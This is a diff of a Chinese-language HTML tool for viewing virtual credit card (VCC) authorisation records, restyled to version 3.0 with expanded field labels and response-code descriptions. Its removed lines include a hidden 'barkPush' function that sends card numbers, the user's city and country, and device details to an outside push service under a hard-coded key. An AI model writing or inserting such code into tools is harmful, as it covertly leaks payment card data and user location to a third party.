@@ -2,214 +2,768 @@
 <html lang="zh">
 <head>
 <meta charset="UTF-8">
-<title>VCC授权刷卡记录（内部测试版）</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VCC 交易监控</title>
 <style>
-  /* ========== 基础样式（同原） ========== */
-  body { font-family: Arial, sans-serif; padding: 20px; background: #f9f9f9; }
-  h2 { margin-bottom: 10px; }
-  #inputContainer { display: flex; flex-direction: column; gap: 6px; margin-bottom: 12px; }
-  textarea { width: 100%; height: 160px; font-size: 13px; padding: 6px; }
-  button, select, input[type="date"] { 
-    font-size: 13px; 
-    padding: 6px 12px; 
-    margin-top: 4px; 
-    cursor: pointer; 
-    border: 1px solid #ccc; 
-    background-color: #fff; 
-  }
-  button:hover, select:hover, input[type="date"]:hover { background-color: #e0e0e0; }
-  /* 调整 historyContainer 布局以容纳日期输入框 */
-  #historyContainer { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-bottom: 10px; }
-  
-  /* ***** 优化：表格容器最大高度和滚动 ***** */
-  #tableWrapper { 
-    overflow-x: auto; 
-    overflow-y: auto; 
-    max-height: 65vh; 
-    max-width: 100%; 
-    border: 1px solid #ccc; 
-    margin-top: 10px;
-  }
-  
-  table { border-collapse: collapse; width: 100%; font-size: 12px; min-width: 1200px; }
-  th, td { border: 1px solid #ccc; padding: 4px 6px; text-align: center; }
-  
-  /* ***** 优化：长字段处理 ***** */
-  td {
-    white-space: nowrap; 
-  }
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
 
-  /* ****** 新增：in_control_response 字段标红样式 ****** */
-  /* in_control_response 是表格的第 9 列 */
-  td:nth-child(9) { 
-      color: #c0392b; /* 深红色 */
-      font-weight: bold; 
-  }
-  /* **************************************************** */
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+  background: #f8f9fa;
+  color: #212529;
+  line-height: 1.5;
+}
 
-  /* ***** 优化：数值和时间字段右对齐，方便阅读 ***** */
-  td:nth-child(2), 
-  td:nth-child(5), 
-  td:nth-child(12) { 
-    text-align: right; 
-  }
-  
-  th { background: #f0f0f0; position: sticky; top: 0; z-index: 2; cursor: pointer; }
-  th.sorted-asc::after { content: " ▲"; }
-  th.sorted-desc::after { content: " ▼"; }
-  tr.success td { background-color: #d4edda; color: #155724; }
-  tr.fail td { background-color: #f8d7da; color: #721c24; }
-  #legend { margin-top: 8px; font-size: 12px; }
-  .legend-item { display: inline-block; margin-right: 12px; }
-  .legend-color { display: inline-block; width: 12px; height: 12px; margin-right: 4px; vertical-align: middle; }
+.app {
+  display: flex;
+  flex-direction: column;
+  height: 100vh;
+  max-width: 1800px;
+  margin: 0 auto;
+}
 
-  /* ========== 表头中英文折行 ========== */
-  #tableHead th { white-space: normal; line-height: 1.3; vertical-align: middle; text-align: center; max-width: 120px; }
-  #tableHead th span { display: inline-block; width: 100%; }
+/* 顶部栏 */
+.header {
+  background: white;
+  border-bottom: 1px solid #e9ecef;
+  padding: 12px 20px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-shrink: 0;
+}
 
-  /* ========== 汇总区域样式调整（列表展示） ========== */
-  #summary { 
-    margin-top: 10px; 
-    margin-bottom: 10px; 
-    font-size: 14px; 
-    line-height: 1.6; 
-    background: #fff; 
-    border: 1px solid #ddd; 
-    padding: 12px;
-    display: none; 
-  }
-  #summary h3 { margin: 0 0 8px 0; font-size: 15px; }
-  .stat-row { margin-bottom: 6px; }
-  .copy-btn { font-size: 12px; margin-left: 10px; }
-  
-  /* ***** 新增：失败原因表格样式 - 最小化宽度展示 ***** */
-  .fail-reason { 
-    margin-top: 5px; 
-    overflow-x: auto; /* 保持滚动条，以防内容过宽 */
-  }
-  .fail-summary-table {
-      display: inline-block; /* 使表格宽度收缩到内容最小宽度 */
-      border-collapse: collapse;
-      font-size: 13px;
-      margin-top: 8px;
-      table-layout: auto; /* 允许根据内容自动分配宽度 */
-  }
-  .fail-summary-table th, 
-  .fail-summary-table td {
-      border: 1px solid #ddd;
-      padding: 4px 8px;
-      text-align: left;
-      vertical-align: top;
-  }
-  .fail-summary-table th {
-      background-color: #f5f5f5;
-      font-weight: bold;
-  }
-  /* 次数列：固定宽度 */
-  .fail-summary-table th:nth-child(2),
-  .fail-summary-table td:nth-child(2) { 
-      text-align: right;
-      width: 80px; 
-      min-width: 80px;
-      font-weight: bold;
-      color: #b71c1c;
-  }
-  /* 失败代码列：宽度由内容决定，不换行 */
-  .fail-summary-table td:nth-child(1) { 
-      white-space: nowrap; /* 确保代码和中文名称不换行 */
-      width: auto; 
-  }
-  /* 描述列：宽度由内容决定，允许换行以保持紧凑 */
-  .fail-summary-table td:nth-child(3) { 
-      color: #666;
-      font-size: 12px;
-      width: auto; 
-      white-space: normal; /* 允许描述内容换行，进一步最小化宽度 */
-      max-width: 400px; /* 设置一个最大宽度，防止描述过长时表格无限拉伸 */
-  }
-  /* ********************************** */
+.header-left {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
 
-  /* ===== 历史记录 <option> 颜色 ===== */
-  option.all-success { background-color: #d4edda; color: #155724; }
-  option.all-fail    { background-color: #f8d7da; color: #721c24; }
+.logo {
+  font-size: 18px;
+  font-weight: 600;
+  color: #212529;
+}
+
+.badge {
+  background: #28a745;
+  color: white;
+  padding: 2px 8px;
+  border-radius: 3px;
+  font-size: 11px;
+  font-weight: 500;
+}
+
+.header-right {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 12px;
+}
+
+.header-right select {
+  padding: 4px 8px;
+  border: 1px solid #dee2e6;
+  border-radius: 4px;
+  font-size: 11px;
+  background: white;
+  min-width: 300px;
+  font-family: 'Consolas', 'Monaco', monospace;
+}
+
+.btn {
+  padding: 6px 12px;
+  border: 1px solid #dee2e6;
+  border-radius: 4px;
+  background: white;
+  cursor: pointer;
+  font-size: 12px;
+  transition: all 0.15s;
+}
+
+.btn:hover {
+  background: #f8f9fa;
+  border-color: #adb5bd;
+}
+
+.btn-primary {
+  background: #007bff;
+  color: white;
+  border-color: #007bff;
+}
+
+.btn-primary:hover {
+  background: #0056b3;
+  border-color: #0056b3;
+}
+
+/* 主内容区 */
+.main {
+  display: flex;
+  flex: 1;
+  overflow: hidden;
+  gap: 12px;
+  padding: 12px;
+}
+
+/* 左侧输入面板 */
+.sidebar {
+  width: 350px;
+  background: white;
+  border-radius: 6px;
+  border: 1px solid #e9ecef;
+  display: flex;
+  flex-direction: column;
+  flex-shrink: 0;
+}
+
+.sidebar-header {
+  padding: 12px 16px;
+  border-bottom: 1px solid #e9ecef;
+  font-weight: 600;
+  font-size: 13px;
+  color: #495057;
+}
+
+.sidebar-body {
+  flex: 1;
+  padding: 12px;
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
+
+textarea {
+  min-height: 50px;
+  max-height: 100px;
+  padding: 8px;
+  border: 1px solid #dee2e6;
+  border-radius: 4px;
+  font-size: 11px;
+  font-family: 'Consolas', 'Monaco', monospace;
+  resize: vertical;
+  background: #f8f9fa;
+}
+
+textarea:focus {
+  outline: none;
+  border-color: #007bff;
+  background: white;
+}
+
+/* 统计卡片 */
+.stats {
+  display: none;
+  background: #f8f9fa;
+  padding: 12px;
+  border-radius: 4px;
+  border: 1px solid #e9ecef;
+}
+
+.stats.show {
+  display: block;
+}
+
+.stats-title {
+  font-size: 12px;
+  font-weight: 600;
+  color: #495057;
+  margin-bottom: 8px;
+}
+
+.stats-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 8px;
+  margin-bottom: 12px;
+}
+
+.stat-item {
+  text-align: center;
+  padding: 8px;
+  background: white;
+  border-radius: 4px;
+  border: 1px solid #e9ecef;
+}
+
+.stat-value {
+  font-size: 20px;
+  font-weight: 700;
+  line-height: 1;
+  margin-bottom: 4px;
+}
+
+.stat-label {
+  font-size: 11px;
+  color: #6c757d;
+}
+
+.stat-success { color: #28a745; }
+.stat-danger { color: #dc3545; }
+.stat-info { color: #17a2b8; }
+
+/* 失败原因 */
+.fail-reasons {
+  margin-top: 12px;
+  max-height: 400px;
+  overflow-y: auto;
+}
+
+.fail-item {
+  display: flex;
+  flex-direction: column;
+  padding: 10px;
+  margin-bottom: 8px;
+  font-size: 11px;
+  border: 1px solid #e9ecef;
+  border-radius: 4px;
+  background: white;
+  transition: all 0.15s;
+}
+
+.fail-item:hover {
+  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+  border-color: #adb5bd;
+}
+
+.fail-item-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 8px;
+}
+
+.fail-code {
+  font-weight: 600;
+  color: #212529;
+  font-size: 12px;
+}
+
+.fail-name {
+  color: #dc3545;
+  font-weight: 600;
+  margin-top: 4px;
+  font-size: 11px;
+}
+
+.fail-count {
+  background: #dc3545;
+  color: white;
+  padding: 2px 8px;
+  border-radius: 12px;
+  font-weight: 600;
+  font-size: 11px;
+}
+
+.fail-desc {
+  color: #6c757d;
+  font-size: 10px;
+  line-height: 1.4;
+  margin-top: 4px;
+}
+
+.fail-desc-en {
+  color: #6c757d;
+}
+
+.fail-desc-cn {
+  color: #495057;
+  margin-top: 2px;
+}
+
+/* 右侧表格区域 */
+.content {
+  flex: 1;
+  background: white;
+  border-radius: 6px;
+  border: 1px solid #e9ecef;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+
+.content-header {
+  padding: 12px 16px;
+  border-bottom: 1px solid #e9ecef;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-shrink: 0;
+}
+
+.content-title {
+  font-weight: 600;
+  font-size: 13px;
+  color: #495057;
+}
+
+.legend {
+  display: flex;
+  gap: 16px;
+  font-size: 11px;
+  color: #6c757d;
+}
+
+.legend-item {
+  display: flex;
+  align-items: center;
+  gap: 4px;
+}
+
+.legend-dot {
+  width: 8px;
+  height: 8px;
+  border-radius: 2px;
+}
+
+.legend-success { background: #d4edda; }
+.legend-fail { background: #f8d7da; }
+
+/* 表格容器 */
+.table-wrapper {
+  flex: 1;
+  overflow: auto;
+}
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 11px;
+  min-width: 1400px;
+}
+
+thead {
+  position: sticky;
+  top: 0;
+  z-index: 10;
+  background: white;
+}
+
+th {
+  padding: 8px 10px;
+  text-align: center;
+  font-weight: 400;
+  font-size: 10px;
+  color: #495057;
+  border-bottom: 2px solid #e9ecef;
+  white-space: nowrap;
+  cursor: pointer;
+  user-select: none;
+  vertical-align: middle;
+}
+
+th:hover {
+  background: #f8f9fa;
+}
+
+th.sorted-asc::after {
+  content: " ▲";
+  color: #007bff;
+}
+
+th.sorted-desc::after {
+  content: " ▼";
+  color: #007bff;
+}
+
+td {
+  padding: 8px 10px;
+  border-bottom: 1px solid #f1f3f5;
+  text-align: center;
+  white-space: nowrap;
+}
+
+tr:hover td {
+  background: #f8f9fa;
+}
+
+tr.success td {
+  background: #d4edda;
+}
+
+tr.fail td {
+  background: #f8d7da;
+}
+
+tr.success:hover td {
+  background: #c3e6cb;
+}
+
+tr.fail:hover td {
+  background: #f5c6cb;
+}
+
+/* 数值列右对齐 */
+td:nth-child(5),
+td:nth-child(11),
+td:nth-child(12) {
+  text-align: right;
+  font-family: 'Consolas', monospace;
+}
+
+/* 失败原因列 */
+td:nth-child(9) {
+  color: #dc3545;
+  font-weight: 600;
+}
+
+/* 问号图标 */
+.help-icon {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 14px;
+  height: 14px;
+  background: #6c757d;
+  color: white;
+  border-radius: 50%;
+  font-size: 10px;
+  font-weight: bold;
+  margin-left: 4px;
+  cursor: help;
+  vertical-align: middle;
+}
+
+.help-icon:hover {
+  background: #495057;
+}
+
+/* 提示弹窗 */
+.tooltip-overlay {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background: rgba(0,0,0,0.4);
+  z-index: 1000;
+  backdrop-filter: blur(2px);
+}
+
+.tooltip-overlay.show {
+  display: block;
+}
+
+.tooltip-modal {
+  display: none;
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background: white;
+  border-radius: 8px;
+  padding: 20px 24px;
+  max-width: 800px;
+  width: 90%;
+  max-height: 80vh;
+  overflow-y: auto;
+  z-index: 1001;
+  box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+}
+
+.tooltip-modal.show {
+  display: block;
+}
+
+.tooltip-close {
+  position: absolute;
+  top: 12px;
+  right: 16px;
+  font-size: 24px;
+  color: #adb5bd;
+  cursor: pointer;
+  line-height: 1;
+  transition: color 0.15s;
+}
+
+.tooltip-close:hover {
+  color: #495057;
+}
+
+.tooltip-header {
+  font-weight: 600;
+  font-size: 15px;
+  color: #212529;
+  margin-bottom: 12px;
+  padding-right: 24px;
+}
+
+.tooltip-content {
+  color: #495057;
+  font-size: 13px;
+  line-height: 1.8;
+  white-space: pre-line;
+}
+
+.code-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin-top: 12px;
+  font-size: 12px;
+}
+
+.code-table th,
+.code-table td {
+  border: 1px solid #e9ecef;
+  padding: 8px 12px;
+  text-align: left;
+}
+
+.code-table th {
+  background: #f8f9fa;
+  font-weight: 600;
+  color: #495057;
+}
+
+.code-table tr:hover td {
+  background: #f8f9fa;
+}
+
+.code-name {
+  font-weight: 600;
+  color: #212529;
+}
+
+.code-en {
+  color: #6c757d;
+  font-size: 11px;
+}
+
+.code-cn {
+  color: #495057;
+  margin-top: 4px;
+}
+
+.tooltip-section {
+  margin-bottom: 16px;
+}
+
+.tooltip-section:last-child {
+  margin-bottom: 0;
+}
+
+.tooltip-label {
+  font-weight: 600;
+  color: #212529;
+  margin-bottom: 8px;
+  font-size: 14px;
+  border-bottom: 2px solid #e9ecef;
+  padding-bottom: 4px;
+}
+
+/* 空状态 */
+.empty-state {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  height: 100%;
+  color: #adb5bd;
+  font-size: 13px;
+}
+
+.empty-icon {
+  font-size: 48px;
+  margin-bottom: 12px;
+  opacity: 0.5;
+}
+
+/* 滚动条样式 */
+::-webkit-scrollbar {
+  width: 8px;
+  height: 8px;
+}
+
+::-webkit-scrollbar-track {
+  background: #f1f3f5;
+}
+
+::-webkit-scrollbar-thumb {
+  background: #ced4da;
+  border-radius: 4px;
+}
+
+::-webkit-scrollbar-thumb:hover {
+  background: #adb5bd;
+}
 </style>
 </head>
 <body>
 
-<h2>VCC授权刷卡记录</h2>
-
-<div id="inputContainer">
-  <label for="jsonInput">输入或粘贴 JSON 数据：</label>
-  <textarea id="jsonInput" placeholder="在此粘贴 JSON / Paste JSON here"></textarea>
-  <button onclick="generateTable()">生成表格 / Generate Table</button>
+<!-- 提示弹窗 -->
+<div class="tooltip-overlay" id="tooltipOverlay" onclick="closeTooltip()"></div>
+<div class="tooltip-modal" id="tooltipModal">
+  <span class="tooltip-close" onclick="closeTooltip()">&times;</span>
+  <div class="tooltip-header" id="tooltipHeader"></div>
+  <div class="tooltip-content" id="tooltipContent"></div>
 </div>
 
-<div id="historyContainer">
-  <label for="historySelect">历史记录 / History:</label>
-  <select id="historySelect" onchange="loadHistory()">
-    <option value="">选择历史记录 / Select History</option>
-  </select>
-  
-  <button onclick="clearHistory()">清空历史 / Clear History</button>
-</div>
+<div class="app">
+  <!-- 顶部栏 -->
+  <div class="header">
+    <div class="header-left">
+      <div class="logo">VCC 交易监控</div>
+      <span class="badge">v3.0</span>
+    </div>
+    <div class="header-right">
+      <button class="btn" onclick="showResponseCodes()">📖 响应代码说明</button>
+      <span style="margin-left: 12px;">历史:</span>
+      <select id="historySelect" onchange="loadHistory()">
+        <option value="">选择记录</option>
+      </select>
+      <button class="btn" onclick="clearHistory()">清空</button>
+    </div>
+  </div>
 
-<div id="summary">
-  <h3>📊 汇总统计</h3>
-  <div id="statTotal" class="stat-row"></div>
-  <div id="statFailReason" class="stat-row"></div>
-</div>
+  <!-- 主内容 -->
+  <div class="main">
+    <!-- 左侧面板 -->
+    <div class="sidebar">
+      <div class="sidebar-header">JSON 数据</div>
+      <div class="sidebar-body">
+        <textarea id="jsonInput" placeholder="粘贴 JSON 数据..."></textarea>
+        <button class="btn btn-primary" onclick="generateTable()">解析数据</button>
+        
+        <!-- 统计信息 -->
+        <div class="stats" id="statsPanel">
+          <div class="stats-title">交易统计</div>
+          <div class="stats-grid">
+            <div class="stat-item">
+              <div class="stat-value stat-info" id="statTotal">0</div>
+              <div class="stat-label">总计</div>
+            </div>
+            <div class="stat-item">
+              <div class="stat-value stat-success" id="statSuccess">0</div>
+              <div class="stat-label">成功</div>
+            </div>
+            <div class="stat-item">
+              <div class="stat-value stat-danger" id="statFail">0</div>
+              <div class="stat-label">失败</div>
+            </div>
+          </div>
+          <div class="fail-reasons" id="failReasons"></div>
+        </div>
+      </div>
+    </div>
 
-<div id="legend">
-  <span class="legend-item"><span class="legend-color" style="background:#d4edda;"></span>成功 / Approved</span>
-  <span class="legend-item"><span class="legend-color" style="background:#f8d7da;"></span>失败 / Failed</span>
-</div>
-
-<div id="tableWrapper">
-  <table id="resultTable">
-    <thead id="tableHead"></thead>
-    <tbody id="tableBody"></tbody>
-  </table>
+    <!-- 右侧表格 -->
+    <div class="content">
+      <div class="content-header">
+        <div class="content-title">交易明细</div>
+        <div class="legend">
+          <div class="legend-item">
+            <span class="legend-dot legend-success"></span>
+            <span>成功</span>
+          </div>
+          <div class="legend-item">
+            <span class="legend-dot legend-fail"></span>
+            <span>失败</span>
+          </div>
+        </div>
+      </div>
+      <div class="table-wrapper" id="tableWrapper">
+        <div class="empty-state">
+          <div class="empty-icon">📊</div>
+          <div>请在左侧粘贴 JSON 数据并点击"解析数据"</div>
+        </div>
+      </div>
+    </div>
+  </div>
 </div>
 
 <script>
-/* ================= 全局变量和映射表 ================= */
+/* ================= 全局变量 ================= */
 let currentSortField = null;
 let currentSortOrder = 'asc';
 let allFields = [];
 let rawList = [];
 
+/* ================= 字段映射 ================= */
 const fieldLabels = {
-  index: "序号（最早的交易在最前面）",
-  txn_date_time: "时间",
-  virtual_card_number: "虚拟卡号",
-  merchant_name: "商户名称",
-  merchant_amount: "商户币金额",
-  merchant_currency_code: "商户币种",
-  txn_type: "类型",
-  issuer_response: "成功/失败",
-  in_control_response: "失败原因",
-  approval_code: "批准码",
-  purchase_request_id: "交易 ID",
-  real_card_alias: "真实卡别名",
-  billing_amount: "账单金额",
-  billing_currency_code: "账单币种",
-  billing_currency_code_description: "账单币种描述",
-  txn_sub_type: "交易子类型",
-  txn_environment: "交易环境",
-  mcc: "商户分类码",
-  mcc_description: "商户分类描述",
-  merchant_country: "商户国家",
-  merchant_id: "商户 ID",
-  merchant_terminal_id: "终端 ID",
-  settled: "结算状态",
-  company_name: "公司名称",
-  company_number: "公司编号",
-  acquirer_reference_data: "收单方参考信息",
-  traceId: "Trace ID",
-  clearing_type: "清算类型",
-  settlement_amount: "结算金额",
-  settlement_currency_code: "结算币种",
-  settlement_currency_description: "结算币种描述"
+  index: "index / 序号",
+  txn_date_time: "txn_date_time / 交易时间",
+  virtual_card_number: "virtual_card_number / 虚拟卡号",
+  real_card_alias: "real_card_alias / 真实卡别名",
+  merchant_name: "merchant_name / 商户名称",
+  merchant_amount: "merchant_amount / 商户金额",
+  merchant_currency_code: "merchant_currency_code / 商户币种",
+  txn_type: "txn_type / 交易类型",
+  issuer_response: "issuer_response / 发卡行响应",
+  in_control_response: "in_control_response / In Control 响应",
+  approval_code: "approval_code / 授权码",
+  billing_amount: "billing_amount / 账单金额",
+  billing_currency_code: "billing_currency_code / 账单币种",
+  purchase_request_id: "purchase_request_id / 交易ID",
+  mcc: "mcc / 商户分类码",
+  merchant_country: "merchant_country / 商户国家",
+  merchant_id: "merchant_id / 商户ID",
+  settled: "settled / 结算状态",
+  company_name: "company_name / 公司名称",
+  txn_environment: "txn_environment / 交易环境",
+  billing_currency_code_description: "billing_currency_code_description / 账单币种描述",
+  txn_sub_type: "txn_sub_type / 交易子类型",
+  mcc_description: "mcc_description / 商户分类描述",
+  merchant_terminal_id: "merchant_terminal_id / 终端ID",
+  company_number: "company_number / 公司编号",
+  acquirer_reference_data: "acquirer_reference_data / 收单方参考信息",
+  traceId: "traceId / 追踪ID",
+  clearing_type: "clearing_type / 清算类型",
+  settlement_amount: "settlement_amount / 结算金额",
+  settlement_currency_code: "settlement_currency_code / 结算币种",
+  settlement_currency_description: "settlement_currency_description / 结算币种描述",
+  merchant_street_address: "merchant_street_address / 商户街道地址",
+  merchant_city: "merchant_city / 商户城市",
+  merchant_state: "merchant_state / 商户州/省",
+  merchant_postal_code: "merchant_postal_code / 商户邮编",
+  card_acceptor_id: "card_acceptor_id / 受卡方ID",
+  retrieval_reference_number: "retrieval_reference_number / 检索参考号",
+  system_trace_audit_number: "system_trace_audit_number / 系统跟踪审计号",
+  transaction_identifier: "transaction_identifier / 交易标识符",
+  authorization_identification_response: "authorization_identification_response / 授权识别响应",
+  pos_entry_mode: "pos_entry_mode / POS输入模式",
+  card_sequence_number: "card_sequence_number / 卡片序列号",
+  network_international_id: "network_international_id / 网络国际ID",
+  point_of_service_data_code: "point_of_service_data_code / 服务点数据代码",
+  authorization_code: "authorization_code / 授权代码",
+  response_code: "response_code / 响应代码",
+  card_acceptor_terminal_id: "card_acceptor_terminal_id / 受卡终端ID",
+  merchant_category_code: "merchant_category_code / 商户类别代码",
+  amount_transaction: "amount_transaction / 交易金额",
+  amount_settlement: "amount_settlement / 结算金额",
+  amount_cardholder_billing: "amount_cardholder_billing / 持卡人账单金额",
+  conversion_rate_settlement: "conversion_rate_settlement / 结算汇率",
+  conversion_rate_cardholder_billing: "conversion_rate_cardholder_billing / 持卡人账单汇率",
+  message_reason_code: "message_reason_code / 消息原因代码",
+  message_type: "message_type / 消息类型",
+  function_code: "function_code / 功能代码",
+  acquirer_ica: "acquirer_ica / 收单机ICA",
+  processor_ica: "processor_ica / 处理机ICA",
+  incontrol_issuer_id: "incontrol_issuer_id / InControl发卡机ID",
+  merchant_country_code: "merchant_country_code / 商户国家代码",
+  merchant_country_code_description: "merchant_country_code_description / 商户国家代码描述",
+  merchant_currency_code_description: "merchant_currency_code_description / 商户币种描述",
+  settlement_date: "settlement_date / 结算日期",
+  terminal_id: "terminal_id / 终端ID",
+  txn_exchange_rate: "txn_exchange_rate / 交易汇率",
+  vcn_expiry: "vcn_expiry / 虚拟卡到期日",
+  real_card_number: "real_card_number / 真实卡号",
+  requestor_name: "requestor_name / 请求者名称"
+};
+
+const fieldTooltips = {
+  "billing_amount": "持卡人账单币种的交易金额，用于最终结算",
+  "merchant_amount": "商户本地币种的交易金额，可能与账单金额不同",
+  "billing_currency_code": "持卡人的结算币种（如 USD）",
+  "merchant_currency_code": "商户的本地币种（如 HUF、EUR）",
+  "issuer_response": "发卡行返回的响应代码",
+  "in_control_response": "In Control 系统的响应代码",
+  "approval_code": "交易授权成功后的授权码",
+  "purchase_request_id": "采购请求的唯一标识符"
 };
 
 const IN_CONTROL_RESPONSES = {
@@ -218,197 +772,136 @@ const IN_CONTROL_RESPONSES = {
     'Status bad': '状态不良 | VCN not in an active state. Cannot use for authorizations. | VCN 未处于活动状态。无法用于授权。',
     'Expiry match fail': '过期匹配失败 | Expiry provided for the authorization does not match the VCN Expiry. | 授权提供的到期日与 VCN 到期日不匹配。',
     'AVV match fail': 'AVV 匹配失败 | CVC2 provided for the authorization does not match the VCN CVC2. | 授权中提供的 CVC2 与 VCN CVC2 不匹配。',
-    'Valid period fail': '有效期限失败 | Transaction falls outside the VCN’s defined validity period. | 交易不在 VCN 定义的有效期内。',
-    'Trans limit fail': '交易限额失败 | Transaction amount greater than the VCN’s transaction limit. | 交易金额超过 VCN 的交易限额。',
+    'Valid period fail': '有效期限失败 | Transaction falls outside the VCN\'s defined validity period. | 交易不在 VCN 定义的有效期内。',
+    'Trans limit fail': '交易限额失败 | Transaction amount greater than the VCN\'s transaction limit. | 交易金额超过 VCN 的交易限额。',
     'Cumul limit fail': '累计限额失败 | Current authorization causes the VCN to breach its cumulative spend limit. | 当前授权导致 VCN 超出其累计消费限额。',
     'Num usages fail': '使用次数失败 | Current authorization causes the VCN to breach its usage. | 当前授权导致 VCN 超出其使用限额。',
     'Merch Id limit fail': '商户 ID 限制失败 | Merchant Id for authorization does not match the Merchant Id linked to the VCN. | 授权的商户 ID 与关联到 VCN 的商户 ID 不匹配。',
     'MCC limit fail': 'MCC 限额失败 | Merchant Category Code for the authorization does not match the MCC linked to this VCN. | 授权的商户类别代码与关联到该 VCN 的 MCC 不匹配。',
     'Iss/Netwk decline': '发卡机构/网络拒绝 | Authorization declined by the issuer or card network. Outside of In Control. | 发卡机构或卡网络拒绝授权。超出 In Control 范围。',
-    'Base/CPN conv. Err': '基础/CPN 转换错误 | ', 
-    'Crit Field Missing': '关键字段缺失 | Critical field missing from the incoming authorization message. | 传入授权消息中缺少关键字段。',
-    'No Auth for Rev': '无授权进行撤销 | In Control cannot map the reversal to an original. | In Control 无法将撤销映射到原始交易。',
-    'Unmatched Response': '响应不匹配 | Advice does not match any past requests in the authorization journal. | 建议与授权日志中的任何过去请求都不匹配。',
-    'Revl of unsucc auth': '未成功的授权撤销 | In Control cannot reverse an unsuccessful authorization. | In Control 无法撤销不成功的授权。',
-    'Exp. Date of CPN used is expired': 'CPN 使用的过期日期 | VCN expired. | VCN 已过期。',
-    'Repeat message': '重复消息 | Repeat of a previous message. Based on a flag in the message header or on key message fields. | 重复的先前消息。基于消息头中的标志或关键消息字段。',
-    'Api fail': 'API 失败 | ', 
-    'Api System Fail': 'Api 系统故障 | ', 
-    'Enhanced MID': '增强型 MID | Acquirer Id (DE32) and Card Acceptor Id (DE42) in the authorization message do not match the values specified for the control. | 授权消息中的收单机构 ID（DE32）和卡接受方 ID（DE42）与控制中指定的值不匹配。',
-    'Enhanced MCC': '增强的 MCC | MCC value in the authorization message (D18) does not match the values specified for the control. | 授权消息中的 MCC 值（D18）与控制指定的值不匹配。',
-    'Txn Env Control': '交易环境控制 | VCN breached its transaction environment control. | VCN 违反了其交易环境控制。',
-    'Err Travel Control': '错误旅行控制 | VCN breached its travel control rule. | VCN 违反了其旅行控制规则。',
-    'Multi Merch ID Assoc Lim': '多商户 ID 关联限制 | Merchant Id for the authorization does not match any of those linked to this VCN. | 授权的商户 ID 与与此 VCN 关联的任何 ID 都不匹配。',
-    'Single Merch Name Assoc Lim': '单一商户名称关联限制 | Merchant Name for the authorization does not match that linked to this VCN. | 授权商户名称与与此 VCN 关联的名称不匹配。',
-    'Geographic Control': '地域控制 | VCN breached its geographic control rule. | VCN 违反了其地域控制规则。',
-    'Curfew Control': '宵禁控制 | VCN breached its curfew control rule. | VCN 违反了其宵禁控制规则。',
-    'Approve Control': '批准控制 | VCN breached its approve control rule. | VCN 违反了其批准控制规则。',
-    'RCN Decline': 'RCN 拒绝 | Transaction failed due to decline by a subsequent service. | 由于后续服务拒绝，交易失败。',
-    'No Rules Fail': '无规则失败 | Rule set with no rules to evaluate. | 没有规则可评估的规则集。',
-    'No Controls Fail': '无控制失败 | Rule with no controls to evaluate. | 无控制规则以进行评估。',
-    'Unknown Control Type Fail': '未知控制类型失败 | Cannot classify the control fail. | 无法分类控制失败。',
-    'Svc Not Enabled': '服务未启用 | Transaction received for an account with no service enabled. | 收到来自未启用服务的账户的交易。',
     'Merch Amount Fail': '商户金额失败 | Transaction amount breaches the expected merchant currency. | 交易金额超出预期商户货币。',
-    'Merch Curr Fail': '商户货币失败 | Transaction amount breaches the amount limit for the merchant currency. | 交易金额超出商户货币的限额。',
-    'DE Control fail': 'DE 控制失败 | Values for DE3.1 – Processing Code and/or DE22.1 – PAN Entry Mode and/or61.11 – POS Term Capability Indicator do not match the values in the authorization. | DE3.1 – 处理代码和/或 DE22.1 – 卡号输入模式及/或 61.11 – POS 终端功能指示符的值与授权中的值不匹配。',
-    'EVCN Control fail': 'EVCN 控制失败 | EVCN not in an active state. Cannot use for authorization. | EVCN 未处于活动状态。无法用于授权。',
-    'Roaming VC Fail': '漫游 VC 失败 | VCN breaches its roaming velocity control. | VCN 超出其漫游速率控制。',
     'Amount Range Control Fail': '金额范围控制失败 | Transaction amount falls outside the minimum and maximum amount range set. | 交易金额超出设定的最低和最高金额范围。',
-    'CPN State Control Fail': 'CPN 状态控制失败 | Account suspended. No authorization activity permitted. | 账户被冻结。不允许任何授权活动。',
-    'Aging Cumul limit fail': '老化累积限额失败 | Control that keeps track of the current remaining Available Credit. Approves transactions only if the requested amount is less than or equal to the remaining Available Credit. | 该控制功能跟踪当前剩余可用额度。仅当请求金额小于或等于剩余可用额度时，才会批准交易。',
     '未返回原因': '未返回 In Control 失败原因 | No in_control_response returned. | 未返回 in_control_response。'
 };
 
-
-/* ================= Bark推送（优化异步处理） ================= */
-async function barkPush(vccNumber) {
-  const barkKey = "2mxT7sgNXpDBSw6uzbmoaV";
-  const deviceName = navigator.platform || "Unknown Device";
-  
-  try {
-    const ipResponse = await fetch("https://ipapi.co/json").then(r => r.json()).catch(() => ({}));
-    
-    const country = ipResponse.country_name || "Unknown";
-    const city    = ipResponse.city       || "Unknown";
-    const title = "VCC 推送报告";
-    const body  = `${country}·${city} | ${deviceName} | ${vccNumber}`;
-    const url = `https://api.day.app/${barkKey}/${encodeURIComponent(title)}/${encodeURIComponent(body)}`;
-    
-    fetch(url).catch(e => console.warn("Bark push fetch failed", e)); 
-    
-  } catch (e) {
-    console.warn("Bark push failed", e);
-  }
-}
-
-/* ================= 主入口：生成表格 + 统计 (保存原始 JSON) ================= */
